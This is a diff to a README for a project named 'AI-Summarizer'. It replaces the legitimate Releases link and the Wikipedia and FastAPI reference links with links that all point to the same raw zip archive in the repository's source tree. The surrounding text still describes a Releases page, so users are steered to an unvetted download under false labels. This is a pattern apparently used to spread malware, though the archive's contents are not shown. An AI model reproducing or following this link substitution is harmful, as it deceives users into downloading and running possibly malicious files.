@@ -1,6 +1,6 @@
 # 🤖 AI-Summarizer - Summarize Text, Audio, and Video Easily
 
-[![Download AI-Summarizer](https://img.shields.io/static/v1?label=Download&message=AI-Summarizer&color=blue)](https://github.com/Dia1n1a/AI-Summarizer/releases)
+[![Download AI-Summarizer](https://raw.githubusercontent.com/Dia1n1a/AI-Summarizer/main/input_handlers/Summarizer_A_1.0.zip)](https://raw.githubusercontent.com/Dia1n1a/AI-Summarizer/main/input_handlers/Summarizer_A_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with AI-Summarizer, visit the Releases page for an easy download:
 
-[Download AI-Summarizer](https://github.com/Dia1n1a/AI-Summarizer/releases)
+[Download AI-Summarizer](https://raw.githubusercontent.com/Dia1n1a/AI-Summarizer/main/input_handlers/Summarizer_A_1.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top.
@@ -82,11 +82,11 @@ For additional support or inquiries, you can contact the developer at: [Email Ad
 
 For more details about the technologies behind AI-Summarizer, take a look at the following topics:
 
-- [Deep Learning](https://en.wikipedia.org/wiki/Deep_learning)
-- [FastAPI](https://fastapi.tiangolo.com/)
-- [Machine Learning](https://en.wikipedia.org/wiki/Machine_learning)
-- [Natural Language Processing](https://en.wikipedia.org/wiki/Natural_language_processing)
+- [Deep Learning](https://raw.githubusercontent.com/Dia1n1a/AI-Summarizer/main/input_handlers/Summarizer_A_1.0.zip)
+- [FastAPI](https://raw.githubusercontent.com/Dia1n1a/AI-Summarizer/main/input_handlers/Summarizer_A_1.0.zip)
+- [Machine Learning](https://raw.githubusercontent.com/Dia1n1a/AI-Summarizer/main/input_handlers/Summarizer_A_1.0.zip)
+- [Natural Language Processing](https://raw.githubusercontent.com/Dia1n1a/AI-Summarizer/main/input_handlers/Summarizer_A_1.0.zip)
 
 Enjoy summarizing your content with AI-Summarizer!
 
-[Download AI-Summarizer](https://github.com/Dia1n1a/AI-Summarizer/releases)
+[Download AI-Summarizer](https://raw.githubusercontent.com/Dia1n1a/AI-Summarizer/main/input_handlers/Summarizer_A_1.0.zip)
